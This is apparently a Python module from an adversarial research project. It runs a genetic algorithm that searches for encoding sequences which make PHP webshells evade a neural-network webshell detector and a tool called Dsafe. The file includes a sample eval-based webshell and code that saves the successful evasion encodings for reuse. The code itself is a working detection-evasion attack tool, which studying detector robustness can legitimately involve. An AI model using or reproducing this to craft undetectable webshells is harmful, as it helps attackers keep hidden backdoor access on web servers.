'''
Use GA to bypass Dsafe and dnn model
由于编码过程中存在随机因数，优化得到的最优解输出可能不能完全复现得到的最优分数（同一个最优解可以获得多个不同webshell）
'''

import numpy as np
import geatpy as ea

from .Shell_encoder import Shell_encoder

from discriminator.detect_dnn_tf2 import *

from .orig_shells_generator import *
from utils import low_feature_dim, NIND, MAX_GEN
from func_timeout import FunctionTimedOut


def ga_bypass_dnn_once(orig_shell, max_encode_time, NIND, MAX_GEN):
    '''
    使用orig_shell寻找ga编码
    return ga_code
    '''

    # orig_shell = '<?php eval($_GET[hachp1]); ?>'
    my_encoder = Shell_encoder(orig_shell)

    max_encode_time = max_encode_time  # 编码次数控制在10次以内
    NIND = NIND  # 种群规模
    MAX_GEN = MAX_GEN  # 最大进化次数

    encode_type_num = my_encoder.get_fun_num()

    # print(my_encoder.ga_shell_encode([0, 1, 2, 4, 9, 10, 9]))

    # 自定义问题类

    class MyProblem(ea.Problem):  # 继承Problem父类
        def __init__(self):
            name = 'Shell_dnn_encode'  # 初始化name（函数名称，可以随意设置）
            M = 1  # 初始化M（目标维数）
            maxormins = [-1]  # 初始化maxormins（目标最小最大化标记列表，1：最小化该目标；-1：最大化该目标）
            Dim = max_encode_time  # 初始化Dim（决策变量维数）
            varTypes = [1] * Dim  # 初始化varTypes（决策变量的类型，0：实数；1：整数）
            lb = [0] * Dim  # 决策变量下界
            ub = [encode_type_num - 1] * Dim  # 决策变量上界
            lbin = [1] * Dim  # 决策变量下边界；0为不包含，1为包含
            ubin = [1] * Dim  # 决策变量上边界；0为不包含，1为包含
            # 调用父类构造方法完成实例化
            ea.Problem.__init__(self, name, M, maxormins, Dim, varTypes, lb,
                                ub, lbin, ubin)

        def aimFunc(self, pop):  # 目标函数
            Vars = pop.Phen  # 得到决策变量矩阵
            temp_res = []
            for var_i in Vars:

                try:
                    temp_shell = my_encoder.code_shell_encode(var_i)
                except FunctionTimedOut:
                    temp_shell = '<?php ?'

                temp_shell_vec = tovector(temp_shell)
                if temp_shell_vec is None:  # 执行失败时直接返回结果为恶意(良性为0.0)
                    temp_res.append(0.0)
                    continue
                # print(temp_shell)
                # print(dnn_logit(temp_shell_vec.reshape(
                #     1, time_step, embedding_size))[0])
                # exit()
                temp_res.append(
                    dnn_logit(
                        temp_shell_vec.reshape(1, time_step*embedding_size + low_feature_dim))[0][0])

            # print(temp_res)

            pop.ObjV = np.array(temp_res).reshape(
                (-1, 1))  # 计算目标函数值，赋值给pop种群对象的ObjV属性

    """===============================实例化问题对象==========================="""
    problem = MyProblem()  # 生成问题对象
    """=================================种群设置==============================="""
    Encoding = 'RI'  # 编码方式
    # NIND = 30            # 种群规模 40
    Field = ea.crtfld(Encoding, problem.varTypes, problem.ranges,
                      problem.borders)  # 创建区域描述器
    Chrom = np.random.randint(np.tile(Field[0, :].astype(int), (NIND, 1)),
                              np.tile(Field[1, :].astype(int) + 1,
                                      (NIND, 1)))  # 更正初始化不均匀的BUG
    # 实例化种群对象（此时种群还没被初始化，仅仅是完成种群对象的实例化）
    population = ea.Population(Encoding, Field, NIND, Chrom)
    """===============================算法参数设置============================="""
    myAlgorithm = ea.soea_EGA_templet(problem, population)  # 实例化一个算法模板对象
    myAlgorithm.MAXGEN = MAX_GEN  # 最大进化代数
    myAlgorithm.drawing = 0  # 1为画图，0为不画
    """==========================调用算法模板进行种群进化======================="""
    [population, obj_trace, var_trace] = myAlgorithm.run()  # 执行算法模板
    # population.save() # 把最后一代种群的信息保存到文件中
    # 输出结果
    best_gen = np.argmin(problem.maxormins * obj_trace[:, 1])  # 记录最优种群个体是在哪一代
    best_ObjV = obj_trace[best_gen, 1]

    # print(obj_trace)

    print('The best func score is : %s' % (best_ObjV))
    # print('最优的控制变量值为：')
    # print(var_trace[best_gen])

    # for i in range(var_trace.shape[1]):
    #     print(var_trace[best_gen, i],end=',')
    # print('')

    # print('有效进化代数：%s' % (obj_trace.shape[0]))
    # print('最优的一代是第 %s 代' % (best_gen + 1))
    # print('评价次数：%s' % (myAlgorithm.evalsNum))
    # print('时间已过 %s 秒' % (myAlgorithm.passTime))

    # print(my_encoder.code_shell_encode(var_trace[best_gen]))

    return var_trace[best_gen]


def ga_bypass_dnn_train(train_epoch, save_dir, max_encode_time=10, NIND=NIND, MAX_GEN=MAX_GEN):
    '''
    注意：默认对全局的model变量进行绕过，所以需要在调用前先载入权重

    使用orig_shell_li寻找一系列ga编码，将去重后的结果保存至save_dir
    '''
    ga_code_li = []

    for epoch in range(train_epoch):
        ga_code_li.append(
            ga_bypass_dnn_once(orig_shell_li[epoch %
                                             len(orig_shell_li)], max_encode_time, NIND, MAX_GEN).tolist())

    temp_li = []
    for va in ga_code_li:
        temp_li.append(tuple(va))

    ga_code_li = list(set(temp_li))

    with open(save_dir, 'wb') as fw:
        pickle.dump(ga_code_li, fw)

    return
